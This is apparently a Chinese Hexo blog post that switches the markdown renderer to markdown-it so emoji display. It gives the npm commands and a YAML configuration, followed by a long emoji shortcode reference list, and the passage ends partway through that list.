    <content type="html"><![CDATA[<p>hexo默认的mk文件渲染引擎是不支持将emoji表情渲染到html页面中的，所以这里我们需要将原来的卸载掉更换支持的引擎再安装emoji插件就好了😁</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">npm un hexo-renderer-marked <span class="hljs-comment">--save</span><br>npm i hexo-renderer-markdown-<span class="hljs-keyword">it</span> <span class="hljs-comment">--save</span><br>npm install markdown-<span class="hljs-keyword">it</span>-emoji <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><h2 id="配置文件"><a class="header-anchor" href="#配置文件">¶</a>配置文件</h2><p>根目录下将下面这段代码贴上去：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">## markdown 渲染引擎配置，默认是hexo-renderer-marked，这个插件渲染速度更快，且有新特性</span><br><span class="hljs-attr">markdown:</span><br>  <span class="hljs-attr">render:</span><br>    <span class="hljs-attr">html:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">xhtmlOut:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">breaks:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">linkify:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">typographer:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">quotes:</span> <span class="hljs-string">&#x27;“”‘’&#x27;</span><br>  <span class="hljs-attr">plugins:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-footnote</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sup</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-abbr</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-emoji</span><br>  <span class="hljs-attr">anchors:</span><br>    <span class="hljs-attr">level:</span> <span class="hljs-number">1</span><br>    <span class="hljs-attr">collisionSuffix:</span> <span class="hljs-string">&#x27;v&#x27;</span><br>    <span class="hljs-attr">permalink:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">permalinkClass:</span> <span class="hljs-string">header-anchor</span><br>    <span class="hljs-attr">permalinkSymbol:</span> <span class="hljs-string">¶</span><br></code></pre></td></tr></table></figure><p>然后编写文章时，将想要加入的emoji编码放上去，下面是常见的emoji编码，放在这里，主要是为了以后自己写文章的时候查找~</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><code class="hljs elixir">emoji编码合集<br><br><span class="hljs-title class_">People</span><br>😐<span class="hljs-symbol">:neutral_face</span>:😄<span class="hljs-symbol">:smile</span>:😆<span class="hljs-symbol">:laughing</span>:<br>😊<span class="hljs-symbol">:blush</span>:😃<span class="hljs-symbol">:smiley</span>:☺️<span class="hljs-symbol">:relaxed</span>:<br>😏<span class="hljs-symbol">:smirk</span>:😍<span class="hljs-symbol">:heart_eyes</span>:😘<span class="hljs-symbol">:kissing_heart</span>:<br>😚<span class="hljs-symbol">:kissing_closed_eyes</span>:😳<span class="hljs-symbol">:flushed</span>:😌<span class="hljs-symbol">:relieved</span>:<br>😆<span class="hljs-symbol">:satisfied</span>:😁<span class="hljs-symbol">:grin</span>:😉<span class="hljs-symbol">:wink</span>:<br>😜<span class="hljs-symbol">:stuck_out_tongue_winking_eye</span>:😝<span class="hljs-symbol">:stuck_out_tongue_closed_eyes</span>:😀<span class="hljs-symbol">:grinning</span>:<br>😗<span class="hljs-symbol">:kissing</span>:😙<span class="hljs-symbol">:kissing_smiling_eyes</span>:😛<span class="hljs-symbol">:stuck_out_tongue</span>:<br>😴<span class="hljs-symbol">:sleeping</span>:😟<span class="hljs-symbol">:worried</span>:😦<span class="hljs-symbol">:frowning</span>:<br>😧<span class="hljs-symbol">:anguished</span>:😮<span class="hljs-symbol">:open_mouth</span>:😬<span class="hljs-symbol">:grimacing</span>:<br>😕<span class="hljs-symbol">:confused</span>:😯<span class="hljs-symbol">:hushed</span>:😑<span class="hljs-symbol">:expressionless</span>:<br>😒<span class="hljs-symbol">:unamused</span>:😅<span class="hljs-symbol">:sweat_smile</span>:😓<span class="hljs-symbol">:sweat</span>:<br>😥<span class="hljs-symbol">:disappointed_relieved</span>:😩<span class="hljs-symbol">:weary</span>:😔<span class="hljs-symbol">:pensive</span>:<br>😞<span class="hljs-symbol">:disappointed</span>:😖<span class="hljs-symbol">:confounded</span>:😨<span class="hljs-symbol">:fearful</span>:<br>😰<span class="hljs-symbol">:cold_sweat</span>:😣<span class="hljs-symbol">:persevere</span>:😢<span class="hljs-symbol">:cry</span>:<br>😭<span class="hljs-symbol">:sob</span>:😂<span class="hljs-symbol">:joy</span>:😲<span class="hljs-symbol">:astonished</span>:<br>😱<span class="hljs-symbol">:scream</span>:💭<span class="hljs-symbol">:thought_balloon</span>:😫<span class="hljs-symbol">:tired_face</span>:<br>😠<span class="hljs-symbol">:angry</span>:😡<span class="hljs-symbol">:rage</span>:😤<span class="hljs-symbol">:triumph</span>:<br>😪<span class="hljs-symbol">:sleepy</span>:😋<span class="hljs-symbol">:yum</span>:😷<span class="hljs-symbol">:mask</span>:<br>😎<span class="hljs-symbol">:sunglasses</span>:😵<span class="hljs-symbol">:dizzy_face</span>:👿<span class="hljs-symbol">:imp</span>:<br>😈<span class="hljs-symbol">:smiling_imp</span>:💬<span class="hljs-symbol">:speech_balloon</span>:😶<span class="hljs-symbol">:no_mouth</span>:<br>😇<span class="hljs-symbol">:innocent</span>:👽<span class="hljs-symbol">:alien</span>:💛<span class="hljs-symbol">:yellow_heart</span>:<br>💙<span class="hljs-symbol">:blue_heart</span>:💜<span class="hljs-symbol">:purple_heart</span>:❤️<span class="hljs-symbol">:heart</span>:<br>💚<span class="hljs-symbol">:green_heart</span>:💔<span class="hljs-symbol">:broken_heart</span>:💓<span class="hljs-symbol">:heartbeat</span>:<br>💗<span class="hljs-symbol">:heartpulse</span>:💕<span class="hljs-symbol">:two_hearts</span>:💞<span class="hljs-symbol">:revolving_hearts</span>:<br>💘<span class="hljs-symbol">:cupid</span>:💖<span class="hljs-symbol">:sparkling_heart</span>:✨<span class="hljs-symbol">:sparkles</span>:<br>⭐️<span class="hljs-symbol">:star</span>:🌟<span class="hljs-symbol">:star2</span>:💫<span class="hljs-symbol">:dizzy</span>:<br>💥<span class="hljs-symbol">:boom</span>:💥<span class="hljs-symbol">:collision</span>:💢<span class="hljs-symbol">:anger</span>:<br>❗️<span class="hljs-symbol">:exclamation</span>:❓<span class="hljs-symbol">:question</span>:❕<span class="hljs-symbol">:grey_exclamation</span>:<br>❔<span class="hljs-symbol">:grey_question</span>:💤<span class="hljs-symbol">:zzz</span>:💨<span class="hljs-symbol">:dash</span>:<br>💦<span class="hljs-symbol">:sweat_drops</span>:🎶<span class="hljs-symbol">:notes</span>:🎵<span class="hljs-symbol">:musical_note</span>:<br>🔥<span class="hljs-symbol">:fire</span>:💩<span class="hljs-symbol">:hankey</span>:💩<span class="hljs-symbol">:poop</span>:<br>💩<span class="hljs-symbol">:shit</span>:👍<span class="hljs-symbol">:+</span><span class="hljs-number">1</span>:👍<span class="hljs-symbol">:thumbsup</span>:<br>👎<span class="hljs-symbol">:-</span><span class="hljs-number">1</span>:👎<span class="hljs-symbol">:thumbsdown</span>:👌<span class="hljs-symbol">:ok_hand</span>:<br>👊<span class="hljs-symbol">:punch</span>:👊<span class="hljs-symbol">:facepunch</span>:✊<span class="hljs-symbol">:fist</span>:<br>✌️<span class="hljs-symbol">:v</span>:👋<span class="hljs-symbol">:wave</span>:✋<span class="hljs-symbol">:hand</span>:<br>✋<span class="hljs-symbol">:raised_hand</span>:👐<span class="hljs-symbol">:open_hands</span>:☝️<span class="hljs-symbol">:point_up</span>:<br>👇<span class="hljs-symbol">:point_down</span>:👈<span class="hljs-symbol">:point_left</span>:👉<span class="hljs-symbol">:point_right</span>:<br>🙌<span class="hljs-symbol">:raised_hands</span>:🙏<span class="hljs-symbol">:pray</span>:👆<span class="hljs-symbol">:point_up_2</span>:<br>👏<span class="hljs-symbol">:clap</span>:💪<span class="hljs-symbol">:muscle</span>:🤘<span class="hljs-symbol">:metal</span>:<br>🖕<span class="hljs-symbol">:fu</span>:🚶<span class="hljs-symbol">:walking</span>:🏃<span class="hljs-symbol">:runner</span>:<br>🏃<span class="hljs-symbol">:running</span>:👫<span class="hljs-symbol">:couple</span>:👪<span class="hljs-symbol">:family</span>:<br>👬<span class="hljs-symbol">:two_men_holding_hands</span>:👭<span class="hljs-symbol">:two_women_holding_hands</span>:💃<span class="hljs-symbol">:dancer</span>:<br>👯<span class="hljs-symbol">:dancers</span>:🙆<span class="hljs-symbol">:ok_woman</span>:🙅<span class="hljs-symbol">:no_good</span>:<br>💁<span class="hljs-symbol">:information_desk_person</span>:🙋<span class="hljs-symbol">:raising_hand</span>:👰<span class="hljs-symbol">:bride_with_veil</span>:<br>🙎<span class="hljs-symbol">:person_with_pouting_face</span>:🙍<span class="hljs-symbol">:person_frowning</span>:🙇<span class="hljs-symbol">:bow</span>:<br>💏<span class="hljs-symbol">:couplekiss</span>:💑<span class="hljs-symbol">:couple_with_heart</span>:💆<span class="hljs-symbol">:massage</span>:<br>💇<span class="hljs-symbol">:haircut</span>:💅<span class="hljs-symbol">:nail_care</span>:👦<span class="hljs-symbol">:boy</span>:<br>👧<span class="hljs-symbol">:girl</span>:👩<span class="hljs-symbol">:woman</span>:👨<span class="hljs-symbol">:man</span>:<br>👶<span class="hljs-symbol">:baby</span>:👵<span class="hljs-symbol">:older_woman</span>:👴<span class="hljs-symbol">:older_man</span>:<br>👱<span class="hljs-symbol">:person_with_blond_hair</span>:👲<span class="hljs-symbol">:man_with_gua_pi_mao</span>:👳<span class="hljs-symbol">:man_with_turban</span>:<br>👷<span class="hljs-symbol">:construction_worker</span>:👮<span class="hljs-symbol">:cop</span>:👼<span class="hljs-symbol">:angel</span>:<br>👸<span class="hljs-symbol">:princess</span>:😺<span class="hljs-symbol">:smiley_cat</span>:😸<span class="hljs-symbol">:smile_cat</span>:<br>😻<span class="hljs-symbol">:heart_eyes_cat</span>:😽<span class="hljs-symbol">:kissing_cat</span>:😼<span class="hljs-symbol">:smirk_cat</span>:<br>🙀<span class="hljs-symbol">:scream_cat</span>:😿<span class="hljs-symbol">:crying_cat_face</span>:😹<span class="hljs-symbol">:joy_cat</span>:<br>😾<span class="hljs-symbol">:pouting_cat</span>:👹<span class="hljs-symbol">:japanese_ogre</span>:👺<span class="hljs-symbol">:japanese_goblin</span>:<br>🙈<span class="hljs-symbol">:see_no_evil</span>:🙉<span class="hljs-symbol">:hear_no_evil</span>:🙊<span class="hljs-symbol">:speak_no_evil</span>:<br>💂<span class="hljs-symbol">:guardsman</span>:💀<span class="hljs-symbol">:skull</span>:🐾<span class="hljs-symbol">:feet</span>:<br>👄<span class="hljs-symbol">:lips</span>:💋<span class="hljs-symbol">:kiss</span>:💧<span class="hljs-symbol">:droplet</span>:<br>👂<span class="hljs-symbol">:ear</span>:👀<span class="hljs-symbol">:eyes</span>:👃<span class="hljs-symbol">:nose</span>:<br>👅<span class="hljs-symbol">:tongue</span>:💌<span class="hljs-symbol">:love_letter</span>:👤<span class="hljs-symbol">:bust_in_silhouette</span>:<br>👥<span class="hljs-symbol">:busts_in_silhouette</span>:<br><br><span class="hljs-title class_">Nature</span><br>☀️<span class="hljs-symbol">:sunny</span>:☔️<span class="hljs-symbol">:umbrella</span>:☁️<span class="hljs-symbol">:cloud</span>:<br>❄️<span class="hljs-symbol">:snowflake</span>:⛄️<span class="hljs-symbol">:snowman</span>:⚡️<span class="hljs-symbol">:zap</span>:<br>🌀<span class="hljs-symbol">:cyclone</span>:🌁<span class="hljs-symbol">:foggy</span>:🌊<span class="hljs-symbol">:ocean</span>:<br>🐱<span class="hljs-symbol">:cat</span>:🐶<span class="hljs-symbol">:dog</span>:🐭<span class="hljs-symbol">:mouse</span>:<br>🐹<span class="hljs-symbol">:hamster</span>:🐰<span class="hljs-symbol">:rabbit</span>:🐺<span class="hljs-symbol">:wolf</span>:<br>🐸<span class="hljs-symbol">:frog</span>:🐯<span class="hljs-symbol">:tiger</span>:🐨<span class="hljs-symbol">:koala</span>:<br>🐻<span class="hljs-symbol">:bear</span>:🐷<span class="hljs-symbol">:pig</span>:🐽<span class="hljs-symbol">:pig_nose</span>:<br>🐮<span class="hljs-symbol">:cow</span>:🐗<span class="hljs-symbol">:boar</span>:🐵<span class="hljs-symbol">:monkey_face</span>:<br>🐒<span class="hljs-symbol">:monkey</span>:🐴<span class="hljs-symbol">:horse</span>:🐎<span class="hljs-symbol">:racehorse</span>:<br>🐫<span class="hljs-symbol">:camel</span>:🐑<span class="hljs-symbol">:sheep</span>:🐘<span class="hljs-symbol">:elephant</span>:<br>🐼<span class="hljs-symbol">:panda_face</span>:🐍<span class="hljs-symbol">:snake</span>:🐦<span class="hljs-symbol">:bird</span>:<br>🐤<span class="hljs-symbol">:baby_chick</span>:🐥<span class="hljs-symbol">:hatched_chick</span>:🐣<span class="hljs-symbol">:hatching_chick</span>:<br>🐔<span class="hljs-symbol">:chicken</span>:🐧<span class="hljs-symbol">:penguin</span>:🐢<span class="hljs-symbol">:turtle</span>:<br>🐛<span class="hljs-symbol">:bug</span>:🐝<span class="hljs-symbol">:honeybee</span>:🐜<span class="hljs-symbol">:ant</span>:<br>🐞<span class="hljs-symbol">:beetle</span>:🐌<span class="hljs-symbol">:snail</span>:🐙<span class="hljs-symbol">:octopus</span>:<br>🐠<span class="hljs-symbol">:tropical_fish</span>:🐟<span class="hljs-symbol">:fish</span>:🐳<span class="hljs-symbol">:whale</span>:<br>🐋<span class="hljs-symbol">:whale2</span>:🐬<span class="hljs-symbol">:dolphin</span>:🐄<span class="hljs-symbol">:cow2</span>:<br>🐏<span class="hljs-symbol">:ram</span>:🐀<span class="hljs-symbol">:rat</span>:🐃<span class="hljs-symbol">:water_buffalo</span>:<br>🐅<span class="hljs-symbol">:tiger2</span>:🐇<span class="hljs-symbol">:rabbit2</span>:🐉<span class="hljs-symbol">:dragon</span>:<br>🐐<span class="hljs-symbol">:goat</span>:🐓<span class="hljs-symbol">:rooster</span>:🐕<span class="hljs-symbol">:dog2</span>:<br>🐖<span class="hljs-symbol">:pig2</span>:🐁<span class="hljs-symbol">:mouse2</span>:🐂<span class="hljs-symbol">:ox</span>:<br>🐲<span class="hljs-symbol">:dragon_face</span>:🐡<span class="hljs-symbol">:blowfish</span>:🐊<span class="hljs-symbol">:crocodile</span>:<br>🐪<span class="hljs-symbol">:dromedary_camel</span>:🐆<span class="hljs-symbol">:leopard</span>:🐈<span class="hljs-symbol">:cat2</span>:<br>🐩<span class="hljs-symbol">:poodle</span>:🐾<span class="hljs-symbol">:paw_prints</span>:💐<span class="hljs-symbol">:bouquet</span>:<br>🌸<span class="hljs-symbol">:cherry_blossom</span>:🌷<span class="hljs-symbol">:tulip</span>:🍀<span class="hljs-symbol">:four_leaf_clover</span>:<br>🌹<span class="hljs-symbol">:rose</span>:🌻<span class="hljs-symbol">:sunflower</span>:🌺<span class="hljs-symbol">:hibiscus</span>:<br>🍁<span class="hljs-symbol">:maple_leaf</span>:🍃<span class="hljs-symbol">:leaves</span>:🍂<span class="hljs-symbol">:fallen_leaf</span>:<br>🌿<span class="hljs-symbol">:herb</span>:🍄<span class="hljs-symbol">:mushroom</span>:🌵<span class="hljs-symbol">:cactus</span>:<br>🌴<span class="hljs-symbol">:palm_tree</span>:🌲<span class="hljs-symbol">:evergreen_tree</span>:🌳<span class="hljs-symbol">:deciduous_tree</span>:<br>🌰<span class="hljs-symbol">:chestnut</span>:🌱<span class="hljs-symbol">:seedling</span>:🌼<span class="hljs-symbol">:blossom</span>:<br>🌾<span class="hljs-symbol">:ear_of_rice</span>:🐚<span class="hljs-symbol">:shell</span>:🌐<span class="hljs-symbol">:globe_with_meridians</span>:<br>🌞<span class="hljs-symbol">:sun_with_face</span>:🌝<span class="hljs-symbol">:full_moon_with_face</span>:🌚<span class="hljs-symbol">:new_moon_with_face</span>:<br>🌑<span class="hljs-symbol">:new_moon</span>:🌒<span class="hljs-symbol">:waxing_crescent_moon</span>:🌓<span class="hljs-symbol">:first_quarter_moon</span>:<br>🌔<span class="hljs-symbol">:waxing_gibbous_moon</span>:🌕<span class="hljs-symbol">:full_moon</span>:🌖<span class="hljs-symbol">:waning_gibbous_moon</span>:<br>🌗<span class="hljs-symbol">:last_quarter_moon</span>:🌘<span class="hljs-symbol">:waning_crescent_moon</span>:🌜<span class="hljs-symbol">:last_quarter_moon_with_face</span>:<br>🌛<span class="hljs-symbol">:first_quarter_moon_with_face</span>:🌔<span class="hljs-symbol">:moon</span>:🌍<span class="hljs-symbol">:earth_africa</span>:<br>🌎<span class="hljs-symbol">:earth_americas</span>:🌏<span class="hljs-symbol">:earth_asia</span>:🌋<span class="hljs-symbol">:volcano</span>:<br>🌌<span class="hljs-symbol">:milky_way</span>:⛅️<span class="hljs-symbol">:partly_sunny</span>:<br><br><span class="hljs-title class_">Objects</span><br>🎍<span class="hljs-symbol">:bamboo</span>:💝<span class="hljs-symbol">:gift_heart</span>:🎎<span class="hljs-symbol">:dolls</span>:<br>🎒<span class="hljs-symbol">:school_satchel</span>:🎓<span class="hljs-symbol">:mortar_board</span>:🎏<span class="hljs-symbol">:flags</span>:<br>🎆<span class="hljs-symbol">:fireworks</span>:🎇<span class="hljs-symbol">:sparkler</span>:🎐<span class="hljs-symbol">:wind_chime</span>:<br>🎑<span class="hljs-symbol">:rice_scene</span>:🎃<span class="hljs-symbol">:jack_o_lantern</span>:👻<span class="hljs-symbol">:ghost</span>:<br>🎅<span class="hljs-symbol">:santa</span>:🎄<span class="hljs-symbol">:christmas_tree</span>:🎁<span class="hljs-symbol">:gift</span>:<br>🔔<span class="hljs-symbol">:bell</span>:🔕<span class="hljs-symbol">:no_bell</span>:🎋<span class="hljs-symbol">:tanabata_tree</span>:<br>🎉<span class="hljs-symbol">:tada</span>:🎊<span class="hljs-symbol">:confetti_ball</span>:🎈<span class="hljs-symbol">:balloon</span>:<br>🔮<span class="hljs-symbol">:crystal_ball</span>:💿<span class="hljs-symbol">:cd</span>:📀<span class="hljs-symbol">:dvd</span>:<br>💾<span class="hljs-symbol">:floppy_disk</span>:📷<span class="hljs-symbol">:camera</span>:📹<span class="hljs-symbol">:video_camera</span>:<br>🎥<span class="hljs-symbol">:movie_camera</span>:💻<span class="hljs-symbol">:computer</span>:📺<span class="hljs-symbol">:tv</span>:<br>📱<span class="hljs-symbol">:iphone</span>:☎️<span class="hljs-symbol">:phone</span>:☎️<span class="hljs-symbol">:telephone</span>:<br>📞<span class="hljs-symbol">:telephone_receiver</span>:📟<span class="hljs-symbol">:pager</span>:📠<span class="hljs-symbol">:fax</span>:<br>💽<span class="hljs-symbol">:minidisc</span>:📼<span class="hljs-symbol">:vhs</span>:🔉<span class="hljs-symbol">:sound</span>:<br>🔈<span class="hljs-symbol">:speaker</span>:🔇<span class="hljs-symbol">:mute</span>:📢<span class="hljs-symbol">:loudspeaker</span>:<br>📣<span class="hljs-symbol">:mega</span>:⌛️<span class="hljs-symbol">:hourglass</span>:⏳<span class="hljs-symbol">:hourglass_flowing_sand</span>:<br>⏰<span class="hljs-symbol">:alarm_clock</span>:⌚️<span class="hljs-symbol">:watch</span>:📻<span class="hljs-symbol">:radio</span>:<br>📡<span class="hljs-symbol">:satellite</span>:➿<span class="hljs-symbol">:loop</span>:🔍<span class="hljs-symbol">:mag</span>:<br>🔎<span class="hljs-symbol">:mag_right</span>:🔓<span class="hljs-symbol">:unlock</span>:🔒<span class="hljs-symbol">:lock</span>:<br>🔏<span class="hljs-symbol">:lock_with_ink_pen</span>:🔐<span class="hljs-symbol">:closed_lock_with_key</span>:🔑<span class="hljs-symbol">:key</span>:<br>💡<span class="hljs-symbol">:bulb</span>:🔦<span class="hljs-symbol">:flashlight</span>:🔆<span class="hljs-symbol">:high_brightness</span>:<br>🔅<span class="hljs-symbol">:low_brightness</span>:🔌<span class="hljs-symbol">:electric_plug</span>:🔋<span class="hljs-symbol">:battery</span>:<br>📲<span class="hljs-symbol">:calling</span>:✉️<span class="hljs-symbol">:email</span>:📫<span class="hljs-symbol">:mailbox</span>:<br>📮<span class="hljs-symbol">:postbox</span>:🛀<span class="hljs-symbol">:bath</span>:🛁<span class="hljs-symbol">:bathtub</span>:<br>🚿<span class="hljs-symbol">:shower</span>:🚽<span class="hljs-symbol">:toilet</span>:🔧<span class="hljs-symbol">:wrench</span>:<br>🔩<span class="hljs-symbol">:nut_and_bolt</span>:🔨<span class="hljs-symbol">:hammer</span>:💺<span class="hljs-symbol">:seat</span>:<br>💰<span class="hljs-symbol">:moneybag</span>:💴<span class="hljs-symbol">:yen</span>:💵<span class="hljs-symbol">:dollar</span>:<br>💷<span class="hljs-symbol">:pound</span>:💶<span class="hljs-symbol">:euro</span>:💳<span class="hljs-symbol">:credit_card</span>:<br>💸<span class="hljs-symbol">:money_with_wings</span>:📧<span class="hljs-symbol">:e-mail</span>:📥<span class="hljs-symbol">:inbox_tray</span>:<br>📤<span class="hljs-symbol">:outbox_tray</span>:✉️<span class="hljs-symbol">:envelope</span>:📨<span class="hljs-symbol">:incoming_envelope</span>:<br>📯<span class="hljs-symbol">:postal_horn</span>:📪<span class="hljs-symbol">:mailbox_closed</span>:📬<span class="hljs-symbol">:mailbox_with_mail</span>:<br>📭<span class="hljs-symbol">:mailbox_with_no_mail</span>:🚪<span class="hljs-symbol">:door</span>:🚬<span class="hljs-symbol">:smoking</span>:<br>💣<span class="hljs-symbol">:bomb</span>:🔫<span class="hljs-symbol">:gun</span>:🔪<span class="hljs-symbol">:hocho</span>:<br>💊<span class="hljs-symbol">:pill</span>:💉<span class="hljs-symbol">:syringe</span>:📄<span class="hljs-symbol">:page_facing_up</span>:<br>📃<span class="hljs-symbol">:page_with_curl</span>:📑<span class="hljs-symbol">:bookmark_tabs</span>:📊<span class="hljs-symbol">:bar_chart</span>:<br>📈<span class="hljs-symbol">:chart_with_upwards_trend</span>:📉<span class="hljs-symbol">:chart_with_downwards_trend</span>:📜<span class="hljs-symbol">:scroll</span>:<br>📋<span class="hljs-symbol">:clipboard</span>:📆<span class="hljs-symbol">:calendar</span>:📅<span class="hljs-symbol">:date</span>:<br>📇<span class="hljs-symbol">:card_index</span>:📁<span class="hljs-symbol">:file_folder</span>:📂<span class="hljs-symbol">:open_file_folder</span>:<br>✂️<span class="hljs-symbol">:scissors</span>:📌<span class="hljs-symbol">:pushpin</span>:📎<span class="hljs-symbol">:paperclip</span>:<br>✒️<span class="hljs-symbol">:black_nib</span>:✏️<span class="hljs-symbol">:pencil2</span>:📏<span class="hljs-symbol">:straight_ruler</span>:<br>📐<span 